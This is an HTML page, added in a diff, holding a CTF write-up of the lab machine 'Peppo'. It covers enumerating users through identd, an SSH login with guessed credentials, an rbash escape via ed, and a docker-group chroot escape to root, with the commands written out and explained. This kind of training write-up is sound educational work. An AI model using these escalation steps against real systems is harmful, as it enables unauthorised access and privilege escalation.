@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Peppo &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Peppo</h1>
+    <div class="meta">Target: <code>192.168.206.60</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">ident</span><span class="tag">DefaultCreds</span><span class="tag">rbash</span><span class="tag">ShellEscape</span><span class="tag">Docker</span><span class="tag">ContainerEscape</span><span class="tag">GroupAbuse</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#ident-service-enumeration">Ident Service Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ssh-as-redacted-with-default-credentials">SSH as ‹redacted› with Default Credentials</a><a class="lvl3" href="#rbash-escape">rbash Escape</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#docker-group-escape-to-root">Docker Group Escape to Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Peppo is a Linux box with a small but important recon wrinkle: the <code>ident</code> service on port 113 leaks the OS user running each listening service, which points directly to valid credentials. SSH access drops into a restricted bash (<code>rbash</code>) shell that needs escaping before anything useful is possible. Once inside a full shell, group membership in <code>docker</code> turns a one-liner into root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE           VERSION
+22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7
+113/tcp   open  ident             FreeBSD identd
+5432/tcp  open  postgresql        PostgreSQL DB 12.3 - 12.4
+8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6)
+|_http-title: Redmine
+10000/tcp open  snet-sensor-mgmt?
+|_auth-owners: ‹redacted›
+</code></pre>
+<p>The nmap output already provides a key detail: <code>auth-owners: ‹redacted›</code> on port 10000. The ident service confirms this pattern.</p>
+<h3 id="ident-service-enumeration">Ident Service Enumeration</h3>
+<p>Port 113 runs <code>identd</code>, which responds to queries about which OS user owns a given TCP connection. Querying it across all open ports:</p>
+<pre><code class="language-sh">ident-user-enum 192.168.206.60 113 8080 10000 22
+192.168.206.60:113      nobody
+192.168.206.60:8080     &lt;unknown&gt;
+192.168.206.60:10000    ‹redacted›
+192.168.206.60:22       root
+</code></pre>
+<blockquote>
+<p><strong>Why ident matters:</strong> The ident protocol was designed so remote servers could verify who initiated a connection. On a multi-user system it leaks every local user running a network service. Here it confirms <code>‹redacted›</code> owns the service on port 10000, meaning <code>‹redacted›</code> is a real, active OS account.</p>
+</blockquote>
+<p>Port 8080 serves Redmine and accepts <code>admin:admin</code>, but this didn't lead anywhere productive.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ssh-as-redacted-with-default-credentials">SSH as ‹redacted› with Default Credentials</h3>
+<p>With <code>‹redacted›</code> identified as a real user, the simplest password guess worked:</p>
+<pre><code class="language-sh">ssh ‹redacted›@192.168.206.60
+‹redacted›@192.168.206.60's password: ‹redacted›
+
+‹redacted›@peppo:~$
+</code></pre>
+<p>The shell feels wrong immediately, many commands return "command not found" or access denied.</p>
+<h3 id="rbash-escape">rbash Escape</h3>
+<p>Checking the shell:</p>
+<pre><code class="language-sh">‹redacted›@peppo:~$ echo $SHELL
+/bin/rbash
+</code></pre>
+<p><code>rbash</code> restricts directory changes, writing to PATH, and executing commands with <code>/</code>. Escaping via the <code>ed</code> text editor (which can spawn a shell):</p>
+<pre><code class="language-sh">‹redacted›@peppo:~$ ed
+!'/bin/bash'
+</code></pre>
+<p>PATH is still broken, so commands still fail:</p>
+<pre><code class="language-sh">‹redacted›@peppo:~$ whoami
+bash: whoami: command not found
+</code></pre>
+<p>Fix it by exporting a full PATH:</p>
+<pre><code class="language-sh">export PATH=&quot;/bin:/sbin:/usr/bin:/usr/sbin:$PATH&quot;
+‹redacted›@peppo:~$ whoami
+‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why <code>ed</code> works for rbash escape:</strong> <code>rbash</code> prevents using absolute paths and modifying PATH, but shell escape features in interactive utilities like <code>ed</code>, <code>less</code>, <code>vim</code>, and <code>man</code> spawn child processes that aren't restricted. The <code>ed</code> line <code>!'command'</code> passes the argument to <code>/bin/sh</code> directly, bypassing rbash entirely.</p>
+</blockquote>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="docker-group-escape-to-root">Docker Group Escape to Root</h3>
+<pre><code class="language-sh">id
+uid=1000(‹redacted›) gid=1000(‹redacted›) groups=1000(‹redacted›),24(cdrom),25(floppy),...,999(docker)
+</code></pre>
+<p><code>‹redacted›</code> is in the <code>docker</code> group.</p>
+<blockquote>
+<p><strong>Why <code>docker</code> group equals root:</strong> Docker daemon runs as root and creates containers with root privileges. A user in the <code>docker</code> group can run <code>docker run</code> without sudo, mount the host filesystem into a container, and chroot into it. This bypasses every file permission on the host because the mount and chroot happen at the container layer, outside the normal FS permission model.</p>
+</blockquote>
+<p>Using the GTFOBins docker escape, mount the root filesystem into a container and chroot in:</p>
+<pre><code class="language-sh">docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>ident (port 113) maps TCP ports to OS users.</strong> It's often overlooked, but a quick <code>ident-user-enum</code> run against all open ports can reveal valid usernames immediately.</li>
+<li><strong>rbash is a speed bump, not a wall.</strong> Editors, pagers, and other interactive tools with shell escape features bypass it in seconds. <code>ed</code>, <code>vim</code>, <code>less</code>, and <code>awk</code> all have documented escapes.</li>
+<li><strong><code>docker</code> group membership is as good as sudo.</strong> Any user in the docker group can read and write any file on the host by mounting <code>/</code> into a container. Check <code>id</code> and <code>groups</code> immediately after foothold.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
